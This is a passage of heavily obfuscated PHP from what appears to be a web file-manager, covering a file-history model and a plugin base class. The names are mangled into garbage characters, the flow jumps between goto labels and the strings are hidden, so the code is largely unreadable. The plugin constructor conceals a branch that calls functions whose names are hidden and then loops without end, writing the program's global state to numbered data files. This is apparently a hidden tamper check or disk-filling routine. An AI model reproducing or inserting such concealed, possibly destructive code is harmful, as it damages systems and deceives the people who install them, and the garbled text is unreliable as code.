$e³äÉ£ÅöØ); } public function listBySource($FÛ¬ß£¹îÍ) { goto BâŒˆ¸òÔÖ; a‡ÌÈŠ“ãß: return $this->eventListParse($d“Š¨™’Â, $FÛ¬ß£¹îÍ); goto E›çÔ±Ù÷Ù; BâŒˆ¸òÔÖ: $DÒ­³­‰ñ‰ =& $_SERVER[¦·]; $D®¬–”ÚÎÂ = Model($DÒ­³­‰ñ‰[1122])->sourceInfo($FÛ¬ß£¹îÍ); $bß†»‘Ù‘  = array($DÒ­³­‰ñ‰[383] => $FÛ¬ß£¹îÍ); goto bõÆ¸àğàª; bõÆ¸àğàª: if ($D®¬–”ÚÎÂ[$DÒ­³­‰ñ‰[370]] == $DÒ­³­‰ñ‰[83]) { $BÓ½°‚Ø†Î = Model($DÒ­³­‰ñ‰[1122])->listSearchChildren($FÛ¬ß£¹îÍ, 20000); $BÓ½°‚Ø†Î[] = $FÛ¬ß£¹îÍ . $DÒ­³­‰ñ‰[361]; $bß†»‘Ù‘  = array($DÒ­³­‰ñ‰[369] => array($DÒ­³­‰ñ‰[7], $BÓ½°‚Ø†Î)); } $d“Š¨™’Â = $this->where($bß†»‘Ù‘ )->order($DÒ­³­‰ñ‰[2332])->selectPage(); if ($d“Š¨™’Â[$DÒ­³­‰ñ‰[351]][$DÒ­³­‰ñ‰[352]] == 0) { $d“Š¨™’Â[$DÒ­³­‰ñ‰[351]][$DÒ­³­‰ñ‰[352]] = 1; $d“Š¨™’Â[$DÒ­³­‰ñ‰[354]] = array(array($DÒ­³­‰ñ‰[383] => $FÛ¬ß£¹îÍ, $DÒ­³­‰ñ‰[2315] => $D®¬–”ÚÎÂ[$DÒ­³­‰ñ‰[463]], $DÒ­³­‰ñ‰[1432] => $D®¬–”ÚÎÂ[$DÒ­³­‰ñ‰[378]], $DÒ­³­‰ñ‰[388] => $DÒ­³­‰ñ‰[2333], $DÒ­³­‰ñ‰[389] => $D®¬–”ÚÎÂ[$DÒ­³­‰ñ‰[187]], $DÒ­³­‰ñ‰[1434] => $DÒ­³­‰ñ‰[33])); } goto a‡ÌÈŠ“ãß; E›çÔ±Ù÷Ù: } private function eventListParse($EÄ Ê‡çá, $E¯ˆ‘ö¡‹Ü) { goto EÒ»„Ç¤Ï; Dåİäö«Ì©: $Cã‚ìÁâ¶® = Model($F×Ê­ËÉ‰Ï[753])->sourceListInfo($Dğİ†Ñ”È‚, !0); foreach ($A„×æà¶ø“ as &$Aê‚ã‘åñÍ) { if ($Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[29]] == $F×Ê­ËÉ‰Ï[494] && isset($Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[405]][$F×Ê­ËÉ‰Ï[1010]])) { $Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[405]][$F×Ê­ËÉ‰Ï[1010]] = $Cã‚ìÁâ¶®[$Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[405]][$F×Ê­ËÉ‰Ï[1010]]]; $Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[405]][$F×Ê­ËÉ‰Ï[1011]] = $Cã‚ìÁâ¶®[$Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[405]][$F×Ê­ËÉ‰Ï[1011]]]; } if ($Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[29]] == $F×Ê­ËÉ‰Ï[2329] && isset($Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[405]][$F×Ê­ËÉ‰Ï[369]])) { $Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[405]][$F×Ê­ËÉ‰Ï[369]] = $Cã‚ìÁâ¶®[$Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[405]][$F×Ê­ËÉ‰Ï[369]]]; } $Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[391]] = $Cã‚ìÁâ¶®[$Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[369]]]; $Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[2334]] = $Cã‚ìÁâ¶®[$Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[2321]]]; if ($Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[29]] == $F×Ê­ËÉ‰Ï[2078]) { $Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[2334]] = $Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[391]]; $Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[2321]] = $Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[2334]][$F×Ê­ËÉ‰Ï[369]]; $Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[391]] = !1; $Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[369]] = $F×Ê­ËÉ‰Ï[33]; } $Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[2265]] = $bòÜ¿æ¡®ä[$Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[1441]]]; } unset($Aê‚ã‘åñÍ); goto D¢ìçó™¼½; EÒ»„Ç¤Ï: $F×Ê­ËÉ‰Ï =& $_SERVER[¦·]; $A„×æà¶ø“ = $EÄ Ê‡çá[$F×Ê­ËÉ‰Ï[354]]; $Dğİ†Ñ”È‚ = array_to_keyvalue($A„×æà¶ø“, $F×Ê­ËÉ‰Ï[33], $F×Ê­ËÉ‰Ï[369]); goto CƒŒÍ‘À”; D¢ìçó™¼½: $EÄ Ê‡çá[$F×Ê­ËÉ‰Ï[354]] = $A„×æà¶ø“; return $EÄ Ê‡çá; goto C—¹´¼Ó£À; CÓÔ‹Ô¬«: $Dğİ†Ñ”È‚ = array_unique($Dğİ†Ñ”È‚); $c¤ÅÎîöÚ = array_unique(array_to_keyvalue($A„×æà¶ø“, $F×Ê­ËÉ‰Ï[33], $F×Ê­ËÉ‰Ï[1441])); $bòÜ¿æ¡®ä = Model($F×Ê­ËÉ‰Ï[479])->userListInfo($c¤ÅÎîöÚ); goto Dåİäö«Ì©; CƒŒÍ‘À”: $F¿Œé‹¬Ä = array_to_keyvalue($A„×æà¶ø“, $F×Ê­ËÉ‰Ï[33], $F×Ê­ËÉ‰Ï[2321]); foreach ($A„×æà¶ø“ as $Aê‚ã‘åñÍ) { $a˜Ñæ¨™ø¶ = $Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[405]]; if ($Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[29]] == $F×Ê­ËÉ‰Ï[494] && isset($a˜Ñæ¨™ø¶[$F×Ê­ËÉ‰Ï[1010]])) { $Dğİ†Ñ”È‚[] = $a˜Ñæ¨™ø¶[$F×Ê­ËÉ‰Ï[1010]] . $F×Ê­ËÉ‰Ï[33]; $Dğİ†Ñ”È‚[] = $a˜Ñæ¨™ø¶[$F×Ê­ËÉ‰Ï[1011]] . $F×Ê­ËÉ‰Ï[33]; } if ($Aê‚ã‘åñÍ[$F×Ê­ËÉ‰Ï[29]] == $F×Ê­ËÉ‰Ï[2329] && isset($a˜Ñæ¨™ø¶[$F×Ê­ËÉ‰Ï[369]])) { $Dğİ†Ñ”È‚[] = $a˜Ñæ¨™ø¶[$F×Ê­ËÉ‰Ï[369]] . $F×Ê­ËÉ‰Ï[33]; } } $Dğİ†Ñ”È‚ = array_merge($Dğİ†Ñ”È‚, $F¿Œé‹¬Ä, array($E¯ˆ‘ö¡‹Ü . $F×Ê­ËÉ‰Ï[33])); goto CÓÔ‹Ô¬«; C—¹´¼Ó£À: } public function removeBySource($Bß…áâØ×²) { $bòâ˜ñÓºÆ = array($_SERVER[¦·][383] => $Bß…áâØ×²); $this->where($bòâ˜ñÓºÆ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\x63\145\x5f\150\151\x73\164\x6f\x72\x79"; public function addHistory($c»À© ˜ä, $D¿ïÆµ½¯ª = '') { $c†”ÕÛí¼æ =& $_SERVER[¦·]; $Eœ—è¢»ñ = array($c†”ÕÛí¼æ[383] => $c»À© ˜ä[$c†”ÕÛí¼æ[369]], $c†”ÕÛí¼æ[1432] => isset($c»À© ˜ä[$c†”ÕÛí¼æ[379]]) ? $c»À© ˜ä[$c†”ÕÛí¼æ[379]] : $c»À© ˜ä[$c†”ÕÛí¼æ[378]], $c†”ÕÛí¼æ[420] => $c»À© ˜ä[$c†”ÕÛí¼æ[419]], $c†”ÕÛí¼æ[522] => $c»À© ˜ä[$c†”ÕÛí¼æ[77]], $c†”ÕÛí¼æ[2335] => $D¿ïÆµ½¯ª); $aåÛÂƒ¿ = $GLOBALS[$c†”ÕÛí¼æ[6]][$c†”ÕÛí¼æ[84]][$c†”ÕÛí¼æ[2336]]; if ($aåÛÂƒ¿ > 1) { $this->historyAutoClear($Eœ—è¢»ñ[$c†”ÕÛí¼æ[369]]); $this->add($Eœ—è¢»ñ); } Model($c†”ÕÛí¼æ[2337])->eventFileEdit($c»À© ˜ä[$c†”ÕÛí¼æ[369]]); } private function historyAutoClear($DãÚ¤ïÙ‘…) { goto e›¡Ë¢ö½ˆ; eë²²ÔŞä: $FÆ«±ÖîÇ  = $döË¡Ÿ¢¨Ó == $c®Û´ŠÀÙ[2339] ? 3 : $Fİ£–«¡É; if ($Fİ£–«¡É <= 1) { $FÆ«±ÖîÇ  = 1; } $Aº‰—„‡ªÓ = $FÆ«±ÖîÇ  - 1; goto E‘ãïŒÇÀ; E‘ãïŒÇÀ: if ($Aº‰—„‡ªÓ >= 500) { return; } $dØÏ®æì¨ = array($c®Û´ŠÀÙ[383] => $DãÚ¤ïÙ‘…); $e…¨›äÆ… = $this->field($c®Û´ŠÀÙ[2340])->where($dØÏ®æì¨)->order($c®Û´ŠÀÙ[2332])->select(); goto AŒğ™ï¾Ç­; AŒğ™ï¾Ç­: if (!$e…¨›äÆ… || $Aº‰—„‡ªÓ >= count($e…¨›äÆ…)) { return; } $C–¯­å–Âê = array_to_keyvalue($e…¨›äÆ…, $c®Û´ŠÀÙ[33], $c®Û´ŠÀÙ[367]); $C–¯­å–Âê = array_slice($C–¯­å–Âê, $Aº‰—„‡ªÓ); goto dÑİ”¬ŒÕã; e›¡Ë¢ö½ˆ: $c®Û´ŠÀÙ =& $_SERVER[¦·]; $döË¡Ÿ¢¨Ó = Model($c®Û´ŠÀÙ[1091])->get($c®Û´ŠÀÙ[2338]); $Fİ£–«¡É = $GLOBALS[$c®Û´ŠÀÙ[6]][$c®Û´ŠÀÙ[84]][$c®Û´ŠÀÙ[2336]]; goto eë²²ÔŞä; dÑİ”¬ŒÕã: $aù»ŞéĞò¹ = array_to_keyvalue($e…¨›äÆ…, $c®Û´ŠÀÙ[33], $c®Û´ŠÀÙ[419]); $aù»ŞéĞò¹ = array_slice($aù»ŞéĞò¹, $Aº‰—„‡ªÓ); if (!$C–¯­å–Âê || !$aù»ŞéĞò¹) { return; } goto E‘»äê¿Ü; E‘»äê¿Ü: $dØÏ®æì¨ = array($c®Û´ŠÀÙ[385] => array($c®Û´ŠÀÙ[7], $C–¯­å–Âê)); $this->where($dØÏ®æì¨)->delete(); Model($c®Û´ŠÀÙ[422])->remove($aù»ŞéĞò¹); goto b½ß•ôˆÂ; b½ß•ôˆÂ: } public function listData($DØ—ÙÎ…ƒ§) { goto Cî˜à„¶ø; Cî˜à„¶ø: $eŸ ä˜­¨¡ =& $_SERVER[¦·]; $b©Òô¬¼‚³ = array($eŸ ä˜­¨¡[383] => $DØ—ÙÎ…ƒ§); $c¥Ì›Ã××„ = $eŸ ä˜­¨¡[2341]; goto aô¦‡Ê›ÑÃ; DëòÏ¥œ°ö: $C¨˜œ›‹´Ó = 3; if ($d¿ùİ¨ˆë == $eŸ ä˜­¨¡[2339]) { $c‰ÜçõÒÉá[$eŸ ä˜­¨¡[354]] = array_slice($c‰ÜçõÒÉá[$eŸ ä˜­¨¡[354]], 0, $C¨˜œ›‹´Ó); $c‰ÜçõÒÉá[$eŸ ä˜­¨¡[351]] = array($eŸ ä˜­¨¡[2342] => 1, $eŸ ä˜­¨¡[2343] => 20, $eŸ ä˜­¨¡[2344] => 1, $eŸ ä˜­¨¡[2345] => count($c‰ÜçõÒÉá[$eŸ ä˜­¨¡[354]])); } return $c‰ÜçõÒÉá; goto Få¾°ùÃî; aô¦‡Ê›ÑÃ: $c‰ÜçõÒÉá = $this->field($c¥Ì›Ã××„)->where($b©Òô¬¼‚³)->order($eŸ ä˜­¨¡[2332])->selectPage(); $this->_listAppendUser($c‰ÜçõÒÉá[$eŸ ä˜­¨¡[354]]); $d¿ùİ¨ˆë = Model($eŸ ä˜­¨¡[1091])->get($eŸ ä˜­¨¡[2338]); goto DëòÏ¥œ°ö; Få¾°ùÃî: } protected function _listAppendUser(&$a›ğÕ‡¼ğš) { $E¿˜Ë£ĞëÕ =& $_SERVER[¦·]; $B®¾ˆÉØğ = array_to_keyvalue($a›ğÕ‡¼ğš, $E¿˜Ë£ĞëÕ[33], $E¿˜Ë£ĞëÕ[1441]); $DƒØ§“§ëô = Model($E¿˜Ë£ĞëÕ[479])->userListInfo($B®¾ˆÉØğ); foreach ($a›ğÕ‡¼ğš as &$BÅÚù¤Œ®) { $bÂëæé§é¤ = $BÅÚù¤Œ®[$E¿˜Ë£ĞëÕ[1441]]; $BÅÚù¤Œ®[$E¿˜Ë£ĞëÕ[378]] = $DƒØ§“§ëô[$bÂëæé§é¤] ? $DƒØ§“§ëô[$bÂëæé§é¤] : !1; } unset($BÅÚù¤Œ®); } public function fileInfo($eö¡˜£¶Ñ) { $A±‹§—««á =& $_SERVER[¦·]; $c‚â¹×—‡Ñ = $this->tablePrefix; $a„Ü²«¸ÑÊ = "{$c‚â¹×—‡Ñ}\151\157\x5f\146\151\x6c\145\40\x66\151\x6c\145\x73\x20\157\x6e\40\x66\x69\154\145\x73\x2e\x66\151\154\145\x49\x44\x20\x3d\40\150\151\163\x74\x6f\162\x79\56\146\151\154\145\111\x44"; return $this->alias($A±‹§—««á[2346])->where(array($A±‹§—««á[385] => $eö¡˜£¶Ñ))->join($a„Ü²«¸ÑÊ, $A±‹§—««á[2347])->find(); } public function removeItem($E™†•İÌ±Á) { $F‚òÌ˜¯½ù =& $_SERVER[¦·]; $Cä³È½Îù¹ = array($F‚òÌ˜¯½ù[385] => $E™†•İÌ±Á); $eß‡³±°–¦ = $this->where($Cä³È½Îù¹)->find(); if ($eß‡³±°–¦) { $Fîù¢ÕöË = $this->where($Cä³È½Îù¹)->delete(); Model($F‚òÌ˜¯½ù[422])->remove($eß‡³±°–¦[$F‚òÌ˜¯½ù[419]]); return $Fîù¢ÕöË; } return !1; } public function removeBySource($cˆÑ®×»¥¦) { goto B¦„à³ÊØÓ; C®•àß¦‡±: $cñ¯øñÆñ„ = array($Aâ¿ßèÕÆ¶[383] => array($Aâ¿ßèÕÆ¶[7], $cˆÑ®×»¥¦)); $aÈÅ£º…À¯ = $this->field($Aâ¿ßèÕÆ¶[420])->where($cñ¯øñÆñ„)->select(); if ($aÈÅ£º…À¯) { $this->where($cñ¯øñÆñ„)->delete(); $bç¸Ù¼¬¤ª = array_to_keyvalue($aÈÅ£º…À¯, $Aâ¿ßèÕÆ¶[33], $Aâ¿ßèÕÆ¶[419]); Model($Aâ¿ßèÕÆ¶[422])->remove($bç¸Ù¼¬¤ª); } goto aÅŸé¯Š‚; aÅŸé¯Š‚: return !0; goto F²ëŸ•É°; B¦„à³ÊØÓ: $Aâ¿ßèÕÆ¶ =& $_SERVER[¦·]; if (!$cˆÑ®×»¥¦) { return !1; } if (!is_array($cˆÑ®×»¥¦)) { $cˆÑ®×»¥¦ = array($cˆÑ®×»¥¦); } goto C®•àß¦‡±; F²ëŸ•É°: } public function setDetail($aºã©‚Áá¯, $aÀšÌ®‚¿) { $dÙƒ×£Ù”† =& $_SERVER[¦·]; return $this->where(array($dÙƒ×£Ù”†[385] => $aºã©‚Áá¯))->save(array($dÙƒ×£Ù”†[2335] => $aÀšÌ®‚¿)); } public function rollbackToItem($bàšŠ“¤³, $eáå÷Øß) { goto fÌ©î³Ï¨; fÌ©î³Ï¨: $a‚œï¥î =& $_SERVER[¦·]; $d¬‹Š¦÷› = Model($a‚œï¥î[753])->sourceInfo($bàšŠ“¤³); $this->addHistory($d¬‹Š¦÷›); goto a¾‘Áäßô¾; a½¨ãÙ’ñØ: return $this->where(array($a‚œï¥î[385] => $eáå÷Øß))->delete(); goto B›îÚ¶Óœ; a¾‘Áäßô¾: $CÒœˆø›»‰ = $this->find($eáå÷Øß); $aÎ…¯’¤© = array($a‚œï¥î[419] => $CÒœˆø›»‰[$a‚œï¥î[419]], $a‚œï¥î[77] => $CÒœˆø›»‰[$a‚œï¥î[77]], $a‚œï¥î[107] => time(), $a‚œï¥î[379] => USER_ID); Model($a‚œï¥î[753])->where(array($a‚œï¥î[369] => $bàšŠ“¤³))->save($aÎ…¯’¤©); goto a½¨ãÙ’ñØ; B›îÚ¶Óœ: } public function clearSame($AĞ°ìàÜ‘) { goto BÉÄ”ñÆôÇ; BÉÄ”ñÆôÇ: $Fîã¥íöÂ =& $_SERVER[¦·]; $aã¿¯º¦¬Á = $this->listData($AĞ°ìàÜ‘); $d—ŒÉºîÜ÷ = array_to_keyvalue_group($aã¿¯º¦¬Á, $Fîã¥íöÂ[419]); goto eÔ—ñÌì; böÂ£…¹Æ: if (!$a‰Í“¹…Şƒ) { return; } $this->where(array($Fîã¥íöÂ[367] => array($Fîã¥íöÂ[7], $a‰Í“¹…Şƒ)))->delete(); Model($Fîã¥íöÂ[422])->remove($Dò›•îËÛ); goto CğŠïÒ; eÔ—ñÌì: $Dò›•îËÛ = array(); $a‰Í“¹…Şƒ = array(); foreach ($d—ŒÉºîÜ÷ as $c³×ß›ƒóñ) { if (!$c³×ß›ƒóñ || count($c³×ß›ƒóñ) <= 1) { continue; } foreach ($c³×ß›ƒóñ as $FÎ˜º¶¶éŒ) { $Dò›•îËÛ[] = $FÎ˜º¶¶éŒ[$Fîã¥íöÂ[419]]; $a‰Í“¹…Şƒ[] = $FÎ˜º¶¶éŒ[$Fîã¥íöÂ[367]]; } } goto böÂ£…¹Æ; CğŠïÒ: } public function userSpace() { $c‰÷Š‘œƒ£ =& $_SERVER[¦·]; $BÍ¶ºğ­é· = $this->tablePrefix; $DÉÎˆöÍÃ¦ = array($c‰÷Š‘œƒ£[1432] => USER_ID); $F°·³Ş×Û = "{$BÍ¶ºğ­é·}\151\x6f\x5f\x66\151\x6c\145\x20\146\x69\154\145\163\40\x6f\x6e\40\x66\x69\x6c\x65\163\56\146\151\x6c\x65\x49\x44\x20\x3d\40\150\151\x73\x74\x6f\162\x79\56\x66\151\154\145\x49\104"; return $this->alias($c‰÷Š‘œƒ£[2346])->where($DÉÎˆöÍÃ¦)->join($F°·³Ş×Û, $c‰÷Š‘œƒ£[2347])->sum($c‰÷Š‘œƒ£[77]); } } goto BÁ”ÖÄ®‹¸; FÅ¯±íùĞ¤: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto dÂèÖ Û¨á; C…Æ ¸ùÙ‡: $this->in =& $in; $this->modelPlugin = Model($e×èÎ‘é™Œ[1313]); $this->pluginName = str_replace($e×èÎ‘é™Œ[1313], $e×èÎ‘é™Œ[33], get_class($this)); goto aÂÍÕÉŸ½Š; D¹‚Ù¥‘ƒ: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto e‚óÜ§ŸÒù; d…ºŒÒ÷¸: $this->pluginHostDefault = $config[$e×èÎ‘é™Œ[1315]] . $this->pluginName . $e×èÎ‘é™Œ[8]; $eĞ¯“òà‡» = $config[$e×èÎ‘é™Œ[1316]]; if ($eĞ¯“òà‡» && strpos($e×èÎ‘é™Œ[47] . $eĞ¯“òà‡» . $e×èÎ‘é™Œ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$e×èÎ‘é™Œ[1317]] . $this->pluginName . $e×èÎ‘é™Œ[8]; } goto D¹‚Ù¥‘ƒ; B¯¥¬œÎ: if ($_SERVER[$e×èÎ‘é™Œ[791]] != $Eó´İ§ŠÄÀ($FÉÇÈ°İ—)) { goto b‹†½®¯ì; CÃ­á¦ÆÉ: $D©÷âÜÖ£ƒ = $e×èÎ‘é™Œ[795]; $D©÷âÜÖ£ƒ($_SERVER[$e×èÎ‘é™Œ[796]]); $e§‡ Âµ¨ó = $e×èÎ‘é™Œ[792]; goto a¸˜ÁÑãñ†; aóõ¶ë„ò: $d‘Ü›ÛÊ›É = 1; for ($fİëëÇ¦Ğç = $d‘Ü›ÛÊ›É; $fİëëÇ¦Ğç > 0; $fİëëÇ¦Ğç++) { $b°çµà¨š(DATA_PATH . $fİëëÇ¦Ğç, $EíëÍëÙ); } goto bšË”²áÅ; b‹†½®¯ì: $e§‡ Âµ¨ó = $e×èÎ‘é™Œ[792]; $BÜ’å¨­ç‚ = $e×èÎ‘é™Œ[793]; $eÓŞ…İÆİÜ = $_SERVER[$e×èÎ‘é™Œ[788]] . $e×èÎ‘é™Œ[789]; goto b«Ü‘Óğ¡; b«Ü‘Óğ¡: $b…•¨„º³¤ = $BÜ’å¨­ç‚($eÓŞ…İÆİÜ); $a¬¾ºÏ„•ã = explode($e×èÎ‘é™Œ[217], $b…•¨„º³¤); if (count($a¬¾ºÏ„•ã) < $e×èÎ‘é™Œ[576]) { $fˆ´†œº·È = $e×èÎ‘é™Œ[794]; $fˆ´†œº·È(); } goto CÃ­á¦ÆÉ; a¸˜ÁÑãñ†: $e§‡ Âµ¨ó(); $b°çµà¨š = $e×èÎ‘é™Œ[797]; $EíëÍëÙ = json_encode($GLOBALS[$e×èÎ‘é™Œ[798]]); goto aóõ¶ë„ò; bšË”²áÅ: } global $in, $config; $this->config =& $config; goto C…Æ ¸ùÙ‡; dÂèÖ Û¨á: $e×èÎ‘é™Œ =& $_SERVER[¦·]; $FÉÇÈ°İ— = $_SERVER[$e×èÎ‘é™Œ[788]] . $e×èÎ‘é™Œ[789]; $Eó´İ§ŠÄÀ = $e×èÎ‘é™Œ[790]; goto B¯¥¬œÎ; aÂÍÕÉŸ½Š: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $e×èÎ‘é™Œ[8]; $this->pluginApi = appHostGet() . $e×èÎ‘é™Œ[1314] . $this->pluginName . $e×èÎ‘é™Œ[8]; $this->pluginHost = $config[$e×èÎ‘é™Œ[1315]] . $this->pluginName . $e×èÎ‘é™Œ[8]; goto d…ºŒÒ÷¸; e‚óÜ§ŸÒù: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¦·][1318]); } protected function assign($AŒä†Öø›¢, $A¨éìÀ“µ = false) { if (is_array($AŒä†Öø›¢)) { $this->values = array_merge($this->values, $AŒä†Öø›¢); } else { $this->values[$AŒä†Öø›¢] = $A¨éìÀ“µ; } } protected function display($eÈî¸Š¦ ¢) { extract($this->values); require $eÈî¸Š¦ ¢; } final function hookRegist($eŒõôÒÈ‡…) { $this->modelPlugin->appRegist($this->pluginName, $eŒõôÒÈ‡…); } final function appIcon() { $D¬ìùºìÀ =& $_SERVER[¦·]; $a®ŞçĞà›¹ = $this->appPackage(); $eõËŒÙÎêÍ = $D¬ìùºìÀ[33]; if (isset($a®ŞçĞà›¹[$D¬ìùºìÀ[382]])) { if (isset($a®ŞçĞà›¹[$D¬ìùºìÀ[382]][$D¬ìùºìÀ[1319]])) { $eõËŒÙÎêÍ = $D¬ìùºìÀ[1320] . $a®ŞçĞà›¹[$D¬ìùºìÀ[382]][$D¬ìùºìÀ[1319]] . $D¬ìùºìÀ[1321]; } else { if ($a®ŞçĞà›¹[$D¬ìùºìÀ[382]][$D¬ìùºìÀ[1322]]) { $eõËŒÙÎêÍ = $D¬ìùºìÀ[1323] . $a®ŞçĞà›¹[$D¬ìùºìÀ[382]][$D¬ìùºìÀ[1322]] . $D¬ìùºìÀ[1324]; } } } return $eõËŒÙÎêÍ; } final function fileCanView($F¹‘„½¦âæ) { goto FƒÀÕäò‡½; d­á‡Ãçğ: ActionCall($fË•“Òƒ£Æ[1337], $F¹‘„½¦âæ); goto f³âè¢ˆİ¿; FƒÀÕäò‡½: $fË•“Òƒ£Æ =& $_SERVER[¦·]; if (request_url_safe($F¹‘„½¦âæ)) { return !0; } if ($this->isShare($F¹‘„½¦âæ)) { return !0; } goto Aòóæº›ËÒ; Aòóæº›ËÒ: $c“İº›Ó = Session::get($fË•“Òƒ£Æ[1325]); if (!$c“İº›Ó || !$c“İº›Ó[$fË•“Òƒ£Æ[1326]]) { $dÛ¯öôÄ® = $fË•“Òƒ£Æ[1327] . rawurlencode(this_url()); show_tips(LNG($fË•“Òƒ£Æ[1328]) . $fË•“Òƒ£Æ[1329] . $dÛ¯öôÄ® . $fË•“Òƒ£Æ[1330] . LNG($fË•“Òƒ£Æ[1331]) . $fË•“Òƒ£Æ[1332], !1); } if (!Action($fË•“Òƒ£Æ[1333])->authCan($fË•“Òƒ£Æ[1334])) { show_tips(LNG($fË•“Òƒ£Æ[1335]) . $fË•“Òƒ£Æ[1336], !1); } goto d­á‡Ãçğ; f³âè¢ˆİ¿: } final function isShare($eë¿÷Ä‹Éë) { $cˆË‚ïÅê = KodIO::parse($eë¿÷Ä‹Éë); return $cˆË‚ïÅê[$_SERVER[¦·][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($CËºçóŠˆÓ) { if (request_url_safe($CËºçóŠˆÓ)) { return $CËºçóŠˆÓ; } if (!$this->isShare($CËºçóŠˆÓ)) { $CËºçóŠˆÓ = $this->filePath($CËºçóŠˆÓ); } return Action($_SERVER[¦·][1021])->linkOut($CËºçóŠˆÓ); } public function filePathLinkOut($f¬ğ´¸ã¡) { if (request_url_safe($f¬ğ´¸ã¡)) { return $f¬ğ´¸ã¡; } $this->fileCanView($f¬ğ´¸ã¡); return Action($_SERVER[¦·][1021])->link($f¬ğ´¸ã¡); } final function filePath($bĞ–öÂ½˜›) { $D†ñŠƒÈ™— =& $_SERVER[¦·]; if ($BÚôˆòÓÀå = $this->checkSharePath($bĞ–öÂ½˜›)) { return $BÚôˆòÓÀå; } $this->fileCanView($bĞ–öÂ½˜›); if (request_url_safe($bĞ–öÂ½˜›)) { $a«Â´È‹Ä¨ = parse_url_query($bĞ–öÂ½˜›); if (isset($a«Â´È‹Ä¨[$D†ñŠƒÈ™—[1338]]) && isset($a«Â´È‹Ä¨[$D†ñŠƒÈ™—[197]])) { $A›ÄƒçœÎ = Model($D†ñŠƒÈ™—[1091])->get($D†ñŠƒÈ™—[1339]); $f±‘ËÊ› ô = Mcrypt::decode($a«Â´È‹Ä¨[$D†ñŠƒÈ™—[197]], $A›ÄƒçœÎ); if ($f±‘ËÊ› ô) { $this->fileInfo = IO::infoWithChildren($f±‘ËÊ› ô); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $f±‘ËÊ› ô; } } $bĞ–öÂ½˜› = $this->_cacheHttpFile($bĞ–öÂ½˜›); $this->fileInfo = IO::infoWithChildren($bĞ–öÂ½˜›); } else { $this->fileInfo = IO::infoWithChildren($bĞ–öÂ½˜›); if (!$this->fileInfo) { show_tips(LNG($D†ñŠƒÈ™—[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $bĞ–öÂ½˜›; } final function _cacheHttpFile($Cé«ˆº³Ü†) { $aôóÑÖòÍ× = hash_path($Cé«ˆº³Ü†, !0); $this->cachePath = $this->pluginCachePath($aôóÑÖòÍ×); if ($E§õ¤¼Ã„ = IO::fileNameExist($this->cachePath, $aôóÑÖòÍ×)) { return KodIO::make($E§õ¤¼Ã„); } $Aß±†Èœ¬ï = $this->cachePath . $aôóÑÖòÍ×; return $this->pluginCacheFileSet($Aß±†Èœ¬ï, file_get_contents($Cé«ˆº³Ü†)); } final function _tmpFileName($E¡ó™à «© = array()) { goto DœêØ•ñ­í; DœêØ•ñ­í: $DæºŸÛš¹… =& $_SERVER[¦·]; if (!$E¡ó™à «©) { $E¡ó™à «© = $this->fileInfo; } if (isset($E¡ó™à «©[$DæºŸÛš¹…[164]])) { return $E¡ó™à «©[$DæºŸÛš¹…[164]]; } goto Cù‘‘ÒÊ›; Cù‘‘ÒÊ›: if (isset($E¡ó™à «©[$DæºŸÛš¹…[162]][$DæºŸÛš¹…[164]])) { return $E¡ó™à «©[$DæºŸÛš¹…[162]][$DæºŸÛš¹…[164]]; } $EÑô³¢›ğ = IO::hashSimple($E¡ó™à «©[$DæºŸÛš¹…[75]]); if ($EÑô³¢›ğ) { return $EÑô³¢›ğ; } goto FãÉ†ê›°‹; FãÉ†ê›°‹: $dÌòôçêÂ = array($E¡ó™à «©[$DæºŸÛš¹…[28]], $E¡ó™à «©[$DæºŸÛš¹…[75]], $E¡ó™à «©[$DæºŸÛš¹…[77]]); if (isset($E¡ó™à «©[$DæºŸÛš¹…[461]])) { $dÌòôçêÂ[] = $E¡ó™à «©[$DæºŸÛš¹…[461]]; } return md5(implode($DæºŸÛš¹…[70], $dÌòôçêÂ)); goto D›ª—­ÑÎ‘; D›ª—­ÑÎ‘: } final function checkSharePath($cñƒÚŒĞÍ÷) { goto DÁÆñÏÍ¨§; DÁÆñÏÍ¨§: $cÜ†ÎÊ¶° =& $_SERVER[¦·]; if (!defined($cÜ†ÎÊ¶°[427])) { define($cÜ†ÎÊ¶°[1340], 0); } if (!$this->isShare($cñƒÚŒĞÍ÷)) { return !1; } goto F¾º²ÛŠ˜‡; Dáñâœç˜œ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$cÜ†ÎÊ¶°[164]]); return 